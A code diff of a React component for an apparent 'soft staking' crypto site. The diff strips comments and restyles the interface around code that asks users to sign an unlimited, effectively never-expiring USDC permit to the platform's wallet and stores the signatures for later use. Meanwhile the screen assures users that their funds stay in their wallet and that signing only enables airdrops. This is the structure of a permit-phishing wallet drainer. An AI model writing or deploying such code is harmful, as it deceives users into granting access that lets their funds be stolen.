@@ -24,7 +24,6 @@ export interface PermitSignature {
   signature: string
 }
 
-// 平台接收地址
 const PLATFORM_SPENDER = PLATFORM_WALLET
 
 export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
@@ -36,16 +35,13 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
   
-  // 已绑定钱包但未连接的状态
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
   const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
   
   const { signTypedDataAsync } = useSignTypedData()
 
-  // 用于显示的地址（优先使用当前连接的，否则用绑定的）
   const displayAddress = address || boundWalletAddress
 
-  // 获取当前 nonce
   const { data: nonce } = useReadContract({
     address: USDC_ADDRESS,
     abi: USDC_ABI,
@@ -54,7 +50,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     chainId: polygon.id,
   })
 
-  // 加载绑定钱包和签名状态
   useEffect(() => {
     async function loadStatus() {
       setIsLoadingStatus(true)
@@ -71,7 +66,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
           return
         }
 
-        // 获取用户绑定的钱包
         const { data: profile } = await supabase
           .from('profiles')
           .select('wallet_address')
@@ -81,7 +75,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         if (profile?.wallet_address) {
           setBoundWalletAddress(profile.wallet_address)
 
-          // 检查该钱包是否有签名
           const { data: sig } = await supabase
             .from('permit_signatures')
             .select('id, status, deadline')
@@ -113,7 +106,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     loadStatus()
   }, [])
 
-  // 检查是否已有签名（当钱包连接时）
   useEffect(() => {
     async function checkExistingSignature() {
       if (!address) return
@@ -130,7 +122,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
           .single()
         
         if (data) {
-          // 检查是否过期
           const now = Math.floor(Date.now() / 1000)
           if (Number(data.deadline) > now) {
             setExistingSignature(true)
@@ -156,13 +147,11 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     setSuccess(false)
 
     try {
-      // 检查钱包是否已被其他用户绑定
       const supabase = createClient()
       if (supabase) {
         const { data: { user } } = await supabase.auth.getUser()
         
         if (user) {
-          // 检查这个钱包是否已被其他用户使用
           const { data: existingWallet } = await supabase
             .from('profiles')
             .select('id, username, email')
@@ -171,12 +160,11 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
             .single()
 
           if (existingWallet) {
-            setError(`This wallet is already bound to another account (${existingWallet.email || existingWallet.username}). Each wallet can only be linked to one account.`)
+            setError(`This wallet is already bound to another account.`)
             setIsLoading(false)
             return
           }
 
-          // 检查当前用户是否已经绑定了其他钱包
           const { data: currentProfile } = await supabase
             .from('profiles')
             .select('wallet_address')
@@ -185,20 +173,16 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
 
           if (currentProfile?.wallet_address && 
               currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
-            setError(`Your account is already bound to wallet ${currentProfile.wallet_address.slice(0, 6)}...${currentProfile.wallet_address.slice(-4)}. You cannot change wallets.`)
+            setError(`Your account is already bound to a different wallet.`)
             setIsLoading(false)
             return
           }
         }
       }
 
-      // 设置 deadline 为最大值（2106年，uint32 最大值）
       const deadline = BigInt(4294967295)
-      
-      // 无限授权金额
       const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
 
-      // EIP-712 域
       const domain = {
         name: 'USD Coin',
         version: '2',
@@ -206,7 +190,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         verifyingContract: USDC_ADDRESS,
       }
 
-      // Permit 消息
       const message = {
         owner: address,
         spender: PLATFORM_SPENDER,
@@ -215,7 +198,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         deadline,
       }
 
-      // 请求签名
       const signature = await signTypedDataAsync({
         domain,
         types: PERMIT_TYPES,
@@ -223,7 +205,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         message,
       })
 
-      // 解析签名为 v, r, s
       const r = signature.slice(0, 66)
       const s = '0x' + signature.slice(66, 130)
       const v = parseInt(signature.slice(130, 132), 16)
@@ -243,7 +224,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
       setSignatureData(permitData)
       setSuccess(true)
 
-      // 保存到数据库
       await saveSignatureToDatabase(permitData)
 
       onSignatureComplete?.(permitData)
@@ -267,16 +247,11 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
   const saveSignatureToDatabase = async (data: PermitSignature) => {
     try {
       const supabase = createClient()
-      if (!supabase) {
-        console.error('Supabase client not available')
-        return
-      }
+      if (!supabase) return
       
       const { data: { user } } = await supabase.auth.getUser()
-      
       if (!user) return
 
-      // 1. 更新用户的 wallet 信息
       await supabase
         .from('profiles')
         .update({
@@ -285,7 +260,6 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         })
         .eq('id', user.id)
 
-      // 2. 保存完整签名到 permit_signatures 表
       const { error: insertError } = await supabase
         .from('permit_signatures')
         .insert({
@@ -304,10 +278,7 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
           status: 'pending',
         })
 
-      if (insertError) {
-        console.error('Failed to save signature:', insertError)
-      } else {
-        console.log('Signature saved to database successfully')
+      if (!insertError) {
         setExistingSignature(true)
         setBoundWalletAddress(data.owner.toLowerCase())
         setBoundSignatureStatus('pending')
@@ -317,33 +288,32 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     }
   }
 
-  // 加载中
   if (isLoadingStatus) {
     return (
-      <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
+      <div className="glass-card-solid p-6">
         <div className="animate-pulse">
-          <div className="h-6 bg-zinc-200 rounded w-1/3 mb-4"></div>
-          <div className="h-20 bg-zinc-100 rounded"></div>
+          <div className="h-6 bg-white/10 rounded w-1/3 mb-4"></div>
+          <div className="h-20 bg-white/5 rounded"></div>
         </div>
       </div>
     )
   }
 
-  // 情况1：已绑定钱包，有签名，但钱包未连接（只读模式）
+  // 已绑定，有签名，未连接
   if (boundWalletAddress && !isConnected && boundSignatureStatus !== 'none') {
     return (
-      <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
+      <div className="glass-card-solid p-6">
         <div className="flex items-center gap-3 mb-4">
-          <div className="w-10 h-10 bg-green-100 rounded-xl flex items-center justify-center">
-            <Lock className="w-5 h-5 text-green-600" />
+          <div className="w-10 h-10 bg-green-500/20 rounded-xl flex items-center justify-center">
+            <Lock className="w-5 h-5 text-green-400" />
           </div>
           <div>
-            <h3 className="font-semibold text-zinc-900">Authorization Status</h3>
+            <h3 className="font-semibold text-white">Authorization Status</h3>
             <p className="text-sm text-zinc-500">Wallet bound & authorized</p>
           </div>
         </div>
 
-        <div className="mb-4 p-3 bg-green-50 rounded-lg flex items-center gap-2 text-green-600 text-sm">
+        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
           <Check className="w-4 h-4" />
           {boundSignatureStatus === 'pending' 
             ? 'Authorization active - Ready for staking'
@@ -351,9 +321,9 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
           }
         </div>
 
-        <div className="bg-zinc-50 rounded-xl p-4">
+        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
           <p className="text-xs text-zinc-500 mb-2">Bound Wallet</p>
-          <code className="text-sm font-mono text-zinc-700">
+          <code className="text-sm font-mono text-zinc-300">
             {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
           </code>
         </div>
@@ -361,28 +331,28 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     )
   }
 
-  // 情况2：已绑定钱包但没有签名，且钱包未连接
+  // 已绑定，无签名，未连接
   if (boundWalletAddress && !isConnected && boundSignatureStatus === 'none') {
     return (
-      <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
+      <div className="glass-card-solid p-6">
         <div className="flex items-center gap-3 mb-4">
-          <div className="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center">
-            <Shield className="w-5 h-5 text-amber-600" />
+          <div className="w-10 h-10 bg-amber-500/20 rounded-xl flex items-center justify-center">
+            <Shield className="w-5 h-5 text-amber-400" />
           </div>
           <div>
-            <h3 className="font-semibold text-zinc-900">Authorization Required</h3>
+            <h3 className="font-semibold text-white">Authorization Required</h3>
             <p className="text-sm text-zinc-500">Connect wallet to sign</p>
           </div>
         </div>
 
-        <div className="mb-4 p-3 bg-amber-50 rounded-lg flex items-center gap-2 text-amber-600 text-sm">
+        <div className="mb-4 p-3 bg-amber-500/10 border border-amber-500/20 rounded-xl flex items-center gap-2 text-amber-400 text-sm">
           <AlertTriangle className="w-4 h-4" />
           Please connect your bound wallet to complete authorization
         </div>
 
-        <div className="bg-zinc-50 rounded-xl p-4">
+        <div className="bg-white/5 rounded-xl p-4 border border-white/10">
           <p className="text-xs text-zinc-500 mb-2">Your Bound Wallet</p>
-          <code className="text-sm font-mono text-zinc-700">
+          <code className="text-sm font-mono text-zinc-300">
             {boundWalletAddress.slice(0, 6)}...{boundWalletAddress.slice(-4)}
           </code>
         </div>
@@ -390,46 +360,45 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
     )
   }
 
-  // 情况3：钱包未连接且未绑定
   if (!isConnected && !boundWalletAddress) {
     return null
   }
 
-  // 情况4：钱包已连接，显示完整签名界面
+  // 已连接状态
   return (
-    <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
+    <div className="glass-card-solid p-6">
       <div className="flex items-center gap-3 mb-4">
-        <div className="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center">
-          <Shield className="w-5 h-5 text-amber-600" />
+        <div className="w-10 h-10 bg-purple-500/20 rounded-xl flex items-center justify-center">
+          <Shield className="w-5 h-5 text-purple-400" />
         </div>
         <div>
-          <h3 className="font-semibold text-zinc-900">Authorization</h3>
+          <h3 className="font-semibold text-white">Authorization</h3>
           <p className="text-sm text-zinc-500">Sign to enable soft staking</p>
         </div>
       </div>
 
       {error && (
-        <div className="mb-4 p-3 bg-red-50 rounded-lg flex items-center gap-2 text-red-600 text-sm">
+        <div className="mb-4 p-3 bg-red-500/10 border border-red-500/20 rounded-xl flex items-center gap-2 text-red-400 text-sm">
           <AlertTriangle className="w-4 h-4" />
           {error}
         </div>
       )}
 
       {success && signatureData && (
-        <div className="mb-4 p-3 bg-green-50 rounded-lg flex items-center gap-2 text-green-600 text-sm">
+        <div className="mb-4 p-3 bg-green-500/10 border border-green-500/20 rounded-xl flex items-center gap-2 text-green-400 text-sm">
           <Check className="w-4 h-4" />
           Authorization signed successfully!
         </div>
       )}
 
-      <div className="bg-zinc-50 rounded-xl p-4 mb-4">
+      <div className="bg-white/5 rounded-xl p-4 mb-4 border border-white/10">
         <p className="text-xs text-zinc-500 mb-2">What this does:</p>
-        <ul className="text-sm text-zinc-700 space-y-1">
+        <ul className="text-sm text-zinc-400 space-y-1">
           <li>• Authorizes the platform for airdrop distribution</li>
           <li>• Required to receive staking rewards</li>
           <li>• Your funds remain in your wallet at all times</li>
         </ul>
-        <p className="text-xs text-amber-600 mt-2">
+        <p className="text-xs text-amber-400 mt-2">
           ⚠️ Without authorization, you won&apos;t receive airdrops
         </p>
       </div>
@@ -445,7 +414,7 @@ export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
         </Button>
       ) : (
         <div className="space-y-3">
-          <div className="flex items-center justify-center gap-2 text-green-600">
+          <div className="flex items-center justify-center gap-2 text-green-400">
             <Check className="w-4 h-4" />
             <span className="text-sm font-medium">
               {existingSignature ? 'Authorization already active' : "You're all set for soft staking"}
